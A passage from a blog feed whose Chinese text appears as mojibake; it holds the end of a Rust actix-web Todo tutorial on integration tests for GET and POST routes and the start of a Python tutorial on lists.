class="line">â”œâ”€â”€ helpers.rs</span><br><span class="line">â””â”€â”€ mod.rs</span><br></pre></td></tr></table></figure><p>åœ¨ <a href="http://main.rs">main.rs</a> ä¸­å¢åŠ  <code>tests</code> æ¨¡å—ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[cfg(test)]</span></span><br><span class="line"><span class="keyword">mod</span> tests;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>handlers.rs</code> ç”¨äºé›†æˆæµ‹è¯•ï¼Œ<code>helpers.rs</code> æä¾›åŸºæœ¬çš„æµ‹è¯•æ–¹æ³•ã€‚</p><p><code>mod.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> handlers;</span><br><span class="line"><span class="keyword">mod</span> helpers;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæµ‹è¯•ä¸€ä¸‹ <code>/</code> è·¯ç”±ä¸‹ <code>hello world</code> çš„åŠŸèƒ½ã€‚</p><p><code>helpers.rs</code> ä¸­å¢åŠ åŸºæœ¬çš„ <code>get</code> æµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::routes::routes;</span><br><span class="line"><span class="keyword">use</span> actix_web::dev::ServiceResponse;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;test, App&#125;;</span><br><span class="line"><span class="comment">// æµ‹è¯•get</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_get</span>(route: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">app</span> = test::<span class="title function_ invoke__">init_service</span>(App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">configure</span>(routes)).<span class="keyword">await</span>;</span><br><span class="line">    test::<span class="title function_ invoke__">call_service</span>(&amp;<span class="keyword">mut</span> app, test::TestRequest::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">uri</span>(route).<span class="title function_ invoke__">to_request</span>()).<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// assert get æ–¹æ³•</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">assert_get</span>(route: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">test_get</span>(route).<span class="keyword">await</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(response.<span class="title function_ invoke__">status</span>().<span class="title function_ invoke__">is_success</span>());</span><br><span class="line">    response</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>handlers.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::tests::helpers::assert_get;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_rt::test]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_hello_world</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">assert_get</span>(<span class="string">&quot;/&quot;</span>).<span class="keyword">await</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œæµ‹è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">running 1 test</span><br><span class="line">test tests::handlers::tests::test_hello_world ... ok</span><br><span class="line"></span><br><span class="line">test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæµ‹è¯•æˆåŠŸäº†ã€‚</p><h2><span id="ce-shi-post-jie-kou">æµ‹è¯• <code>POST</code> æ¥å£</span></h2><p>æˆ‘ä»¬å¢åŠ  <code>lazy_static</code> å’Œ <code>serde_json</code> åº“ï¼Œå‰è€…ç”¨äºå»¶åæ‰§è¡Œï¼Œåè€…ç”¨äºæ–¹ä¾¿å¤„ç† json æ•°æ®ã€‚</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dev-dependencies]</span></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4.0&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0.48&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨é›†æˆæµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æ•°æ®åº“é“¾æ¥è¿›è¡Œæµ‹è¯•ï¼Œé¦–å…ˆ <code>helpers.rs</code> ä¸­å¢åŠ  <code>AppState</code> ç”¨äºæµ‹è¯•ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">lazy_static! &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">static</span> <span class="keyword">ref</span> APP_STATE: models::AppState = &#123;</span><br><span class="line">        <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">config</span> = Config::<span class="title function_ invoke__">from_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">pool</span> = <span class="title function_ invoke__">init_pool</span>(&amp;config).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        models::AppState &#123; pool: pool.<span class="title function_ invoke__">clone</span>() &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥åŠå¯¹åº”çš„ post æµ‹è¯•æ–­è¨€ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…¶ä¸­ `AppState` éœ€è¦å¢åŠ  `Clone` å®</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_post</span>&lt;T: Serialize&gt;(route: &amp;<span class="type">str</span>, params: T) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">app</span> = test::<span class="title function_ invoke__">init_service</span>(App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">data</span>(APP_STATE.<span class="title function_ invoke__">clone</span>()).<span class="title function_ invoke__">configure</span>(routes)).<span class="keyword">await</span>;</span><br><span class="line">    test::<span class="title function_ invoke__">call_service</span>(</span><br><span class="line">        &amp;<span class="keyword">mut</span> app,</span><br><span class="line">        test::TestRequest::<span class="title function_ invoke__">post</span>()</span><br><span class="line">            .<span class="title function_ invoke__">set_json</span>(&amp;params)</span><br><span class="line">            .<span class="title function_ invoke__">uri</span>(route)</span><br><span class="line">            .<span class="title function_ invoke__">to_request</span>(),</span><br><span class="line">    )</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">assert_post</span>&lt;T: Serialize&gt;(route: &amp;<span class="type">str</span>, params: T) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">test_post</span>(route, params).<span class="keyword">await</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(response.<span class="title function_ invoke__">status</span>().<span class="title function_ invoke__">is_success</span>());</span><br><span class="line">    response</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬å¢åŠ ä¸€ä¸ªåˆ›å»º todo_list çš„æµ‹è¯•ï¼ŒåŒ…å«åˆ›å»ºå¹¶æ£€æµ‹æ˜¯å¦å­˜åœ¨ï¼š</p><p><code>tests/handlers.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[actix_rt::test]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_create_todos</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todo_title</span> = <span class="string">&quot;Create todo List&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">params</span> = CreateTodoList &#123;</span><br><span class="line">        title: todo_title.<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">assert_post</span>(<span class="string">&quot;/todos&quot;</span>, params).<span class="keyword">await</span>;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ”¾è¿”å›æ•°æ®</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">body</span> = test::<span class="title function_ invoke__">read_body</span>(response).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">try_created</span>: <span class="type">Result</span>&lt;models::TodoList, serde_json::error::Error&gt; =</span><br><span class="line">        serde_json::<span class="title function_ invoke__">from_slice</span>(&amp;body);</span><br><span class="line">    <span class="built_in">assert!</span>(try_created.<span class="title function_ invoke__">is_ok</span>(), <span class="string">&quot;Response couldn&#x27;t not be parsed&quot;</span>);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨æ¥å£æŸ¥çœ‹æ•°æ®</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">created_list</span> = try_created.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">resp</span> = <span class="title function_ invoke__">assert_get</span>(<span class="string">&quot;/todos&quot;</span>).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span>: <span class="type">Vec</span>&lt;models::TodoList&gt; = test::<span class="title function_ invoke__">read_body_json</span>(resp).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">maybe_list</span> = todos.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|todo| todo.id == created_list.id);</span><br><span class="line">    <span class="built_in">assert!</span>(maybe_list.<span class="title function_ invoke__">is_some</span>(), <span class="string">&quot;Item not found!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>CreateTodoList</code> éœ€è¦å¢åŠ  <code>Clone</code> å®ï¼Œæ‰èƒ½åœ¨ä¼ å…¥ <code>params</code> å‚æ•°æ—¶æ­£å¸¸ä½¿ç”¨ã€‚</p><p>è¿è¡Œæµ‹è¯•ï¼ŒæŸ¥çœ‹ç»“æœ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">running 2 tests</span><br><span class="line">test tests::handlers::test_hello_world ... ok</span><br><span class="line">test tests::handlers::test_create_todos ... ok</span><br><span class="line"></span><br><span class="line">test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out</span><br></pre></td></tr></table></figure><h2><span id="ce-shi-get-jie-kou">æµ‹è¯• <code>GET</code> æ¥å£</span></h2><p>æœ€åæ·»åŠ  <code>GET</code> é›†æˆæµ‹è¯•ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::db::create_todo;</span><br><span class="line"><span class="keyword">use</span> crate::tests::helpers::&#123;assert_get, assert_post, APP_STATE&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::Client;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_rt::test]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_get_todos</span>() &#123;</span><br><span class="line">    <span class="comment">// create data in db</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todo_title</span> = <span class="string">&quot;New Todo List&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = APP_STATE</span><br><span class="line">        .pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_todo</span> = <span class="title function_ invoke__">create_todo</span>(&amp;client, todo_title.<span class="title function_ invoke__">into</span>()).<span class="keyword">await</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(new_todo.<span class="title function_ invoke__">is_ok</span>(), <span class="string">&quot;Failed to create new test todo&quot;</span>);</span><br><span class="line">    <span class="comment">// get and check</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_todo</span> = new_todo.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">assert_get</span>(<span class="string">&quot;/todos&quot;</span>).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span>: <span class="type">Vec</span>&lt;models::TodoList&gt; = test::<span class="title function_ invoke__">read_body_json</span>(response).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">maybe_list</span> = todos.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|todo| todo.id == new_todo.id);</span><br><span class="line">    <span class="built_in">assert!</span>(maybe_list.<span class="title function_ invoke__">is_some</span>(), <span class="string">&quot;Item not found!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">$ cargo test</span><br><span class="line"></span><br><span class="line">running <span class="number">3</span> tests</span><br><span class="line">test tests::handlers::test_hello_world ... ok</span><br><span class="line">test tests::handlers::test_get_todos ... ok</span><br><span class="line">test tests::handlers::test_create_todos ... ok</span><br><span class="line"></span><br><span class="line">test result: ok. <span class="number">3</span> passed; <span class="number">0</span> failed; <span class="number">0</span> ignored; <span class="number">0</span> measured; <span class="number">0</span> filtered out</span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">å°ç»“</span></h2><ol><li>ç®€å•é‡æ„ï¼ŒæŠ½è±¡å·¥å…·å‡½æ•°ï¼›</li><li>æŠ½è±¡æµ‹è¯•å·¥å…·å‡½æ•°ï¼›</li><li>åˆ›å»º <code>GET</code> å’Œ <code>POST</code> æµ‹è¯•ã€‚</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">å‚è€ƒæ–‡æ¡£å’Œé¡¹ç›®</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://github.com/actix/examples">å®˜æ–¹ actix-web ç¤ºä¾‹</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆå››ï¼‰â”€â”€ æµ‹è¯•
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>01. List â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-118/"/>
    <id>https://qiwihui.com/qiwihui-blog-118/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ—è¡¨ï¼ˆListï¼‰æ˜¯ä¸€ç§æœ‰åºä¸”å¯å˜çš„å®¹å™¨æ•°æ®ç±»å‹ã€‚ ä¸é›†åˆï¼ˆSetï¼‰ä¸åŒï¼Œåˆ—è¡¨å…è®¸é‡å¤çš„å…ƒç´ ã€‚ å®ƒæ–¹ä¾¿ä¿å­˜æ•°æ®åºåˆ—å¹¶å¯¹å…¶è¿›è¡Œè¿›ä¸€æ­¥è¿­ä»£ã€‚ åˆ—è¡¨ç”¨æ–¹æ‹¬å·åˆ›å»ºã€‚</p><span id="more"></span><p><code>my_list = [&quot;banana&quot;, &quot;cherry&quot;, &quot;apple&quot;]</code></p><h3><span id="python-zhong-ji-ben-de-nei-zhi-rong-qi-shu-ju-lei-xing-de-bi-jiao">Pythonä¸­åŸºæœ¬çš„å†…ç½®å®¹å™¨æ•°æ®ç±»å‹çš„æ¯”è¾ƒï¼š</span></h3><ul><li>åˆ—è¡¨ï¼ˆListï¼‰æ˜¯ä¸€ä¸ªæœ‰åºä¸”å¯å˜çš„æ•°æ®ç±»å‹ã€‚ å…è®¸é‡å¤çš„æˆå‘˜ã€‚</li><li>å…ƒç»„ï¼ˆTupleï¼‰æ˜¯æœ‰åºä¸”ä¸å¯å˜çš„æ•°æ®ç±»å‹ã€‚ å…è®¸é‡å¤çš„æˆå‘˜ã€‚</li><li>é›†åˆï¼ˆSetï¼‰æ˜¯æ— åºå’Œæœªç´¢å¼•çš„æ•°æ®ç±»å‹ã€‚ ä¸å…è®¸é‡å¤çš„æˆå‘˜ã€‚</li><li>å­—å…¸ï¼ˆDictï¼‰æ˜¯æ— åºï¼Œå¯å˜å’Œå¯ç´¢å¼•çš„æ•°æ®ç±»å‹ã€‚ æ²¡æœ‰é‡å¤çš„æˆå‘˜ã€‚</li><li>å­—ç¬¦ä¸²æ˜¯Unicodeä»£ç çš„ä¸å¯å˜åºåˆ—ã€‚</li></ul><h3><span id="chuang-jian-lie-biao">åˆ›å»ºåˆ—è¡¨</span></h3><p>åˆ—è¡¨ä½¿ç”¨æ–¹æ‹¬å·åˆ›å»ºï¼Œæˆ–è€…å†…ç½®çš„ list å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_1 = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(list_1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨ list å‡½æ•°åˆ›å»ºç©ºåˆ—è¡¨</span></span><br><span class="line">list_2 = <span class="built_in">list</span>()</span><br><span class="line"><span class="built_in">print</span>(list_2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨å…è®¸ä¸åŒçš„æ•°æ®ç±»</span></span><br><span class="line">list_3 = [<span class="number">5</span>, <span class="literal">True</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(list_3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨å…è®¸é‡å¤å…ƒç´ </span></span><br><span class="line">list_4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(list_4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[]</span><br><span class="line">[<span class="number">5</span>, <span class="literal">True</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3><span id="fang-wen-yuan-su">è®¿é—®å…ƒç´ </span></h3><p>å¯ä»¥é€šè¿‡ç´¢å¼•å·è®¿é—®åˆ—è¡¨é¡¹ã€‚ è¯·æ³¨æ„ï¼Œç´¢å¼•ä»0å¼€å§‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = list_1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è´Ÿç´¢å¼•ï¼Œæ¯”å¦‚ -1 è¡¨ç¤ºæœ€åä¸€ä¸ªå…ƒç´ ï¼Œ</span></span><br><span class="line"><span class="comment"># -2 è¡¨ç¤ºå€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä»¥æ­¤ç±»æ¨</span></span><br><span class="line">item = list_1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banana</span><br><span class="line">apple</span><br></pre></td></tr></table></figure><h3><span id="xiu-gai-yuan-su">ä¿®æ”¹å…ƒç´ </span></h3><p>åªéœ€è®¿é—®ç´¢å¼•å¹¶åˆ†é…ä¸€ä¸ªæ–°å€¼å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ—è¡¨åˆ›å»ºä¹‹åå¯ä»¥è¢«ä¿®æ”¹</span></span><br><span class="line">list_1[<span class="number">2</span>] = <span class="string">&quot;lemon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(list_1)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;lemon&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="you-yong-de-fang-fa">æœ‰ç”¨çš„æ–¹æ³•</span></h3><p>æŸ¥çœ‹Pythonæ–‡æ¡£ä»¥æŸ¥çœ‹æ‰€æœ‰åˆ—è¡¨æ–¹æ³•ï¼š<a href="https://docs.python.org/3/tutorial/datastructures.html">https://docs.python.org/3/tutorial/datastructures.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># len() : è·å–åˆ—è¡¨çš„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length:&quot;</span>, <span class="built_in">len</span>(my_list))</span><br><span class="line"></span><br><span class="line"><span class="comment"># append() : æ·»åŠ ä¸€ä¸ªå…ƒç´ åˆ°åˆ—è¡¨æœ«å°¾</span></span><br><span class="line">my_list.append(<span class="string">&quot;orange&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># insert() : æ·»åŠ å…ƒç´ åˆ°ç‰¹å®šä½ç½®</span></span><br><span class="line">my_list.insert(<span class="number">1</span>, <span class="string">&quot;blueberry&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() : ç§»é™¤å¹¶è¿”å›ç‰¹å®šä½ç½®çš„å…ƒç´ ï¼Œé»˜è®¤ä¸ºæœ€åä¸€ä¸ª</span></span><br><span class="line">item = my_list.pop()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Popped item: &quot;</span>, item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove() : ç§»é™¤åˆ—è¡¨ä¸­çš„å…ƒç´ </span></span><br><span class="line">my_list.remove(<span class="string">&quot;cherry&quot;</span>) <span class="comment"># å¦‚æœå…ƒç´ æ²¡æœ‰åœ¨åˆ—è¡¨ä¸­ï¼Œåˆ™è§¦å‘ Value error</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : ç§»é™¤åˆ—è¡¨æ‰€æœ‰å…ƒç´ </span></span><br><span class="line">my_list.clear()</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse() : ç¿»è½¬åˆ—è¡¨</span></span><br><span class="line">my_list = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line">my_list.reverse()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Reversed: &#x27;</span>, my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort() : å‡åºæ’åˆ—å…ƒç´ </span></span><br><span class="line">my_list.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sorted: &#x27;</span>, my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ sorted() å¾—åˆ°ä¸€ä¸ªæ–°åˆ—è¡¨ï¼ŒåŸæ¥çš„åˆ—è¡¨ä¸å—å½±å“</span></span><br><span class="line"><span class="comment"># sorted() å¯¹ä»»ä½•å¯è¿­ä»£ç±»å‹èµ·ä½œç”¨ï¼Œä¸åªæ˜¯åˆ—è¡¨</span></span><br><span class="line">my_list = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line">new_list = <span class="built_in">sorted</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå…·æœ‰é‡å¤å…ƒç´ çš„åˆ—è¡¨</span></span><br><span class="line">list_with_zeros = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(list_with_zeros)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨æ‹¼æ¥</span></span><br><span class="line">list_concat = list_with_zeros + my_list</span><br><span class="line"><span class="built_in">print</span>(list_concat)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²è½¬åˆ—è¡¨</span></span><br><span class="line">string_to_list = <span class="built_in">list</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(string_to_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Length: <span class="number">3</span></span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;blueberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">Popped item:  orange</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;blueberry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[]</span><br><span class="line">Reversed:  [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>]</span><br><span class="line">Sorted:  [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="fu-zhi-lie-biao">å¤åˆ¶åˆ—è¡¨</span></h3><p>å¤åˆ¶å¼•ç”¨ï¼ˆreferencesï¼‰æ—¶è¦å°å¿ƒã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_org = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™åªæ˜¯å°†å¼•ç”¨å¤åˆ¶åˆ°åˆ—è¡¨ä¸­ï¼Œè¦å°å¿ƒ</span></span><br><span class="line">list_copy = list_org</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ï¼Œä¿®æ”¹å¤åˆ¶çš„åˆ—è¡¨ä¹Ÿä¼šå½±å“åŸæ¥çš„åˆ—è¡¨</span></span><br><span class="line">list_copy.append(<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(list_copy)</span><br><span class="line"><span class="built_in">print</span>(list_org)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ copy(), æˆ–è€… list(x) æ¥çœŸæ­£å¤åˆ¶åˆ—è¡¨</span></span><br><span class="line"><span class="comment"># åˆ‡ç‰‡ï¼ˆslicingï¼‰ä¹Ÿå¯ä»¥å¤åˆ¶ï¼šlist_copy = list_org[:]</span></span><br><span class="line">list_org = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"></span><br><span class="line">list_copy = list_org.copy()</span><br><span class="line"><span class="comment"># list_copy = list(list_org)</span></span><br><span class="line"><span 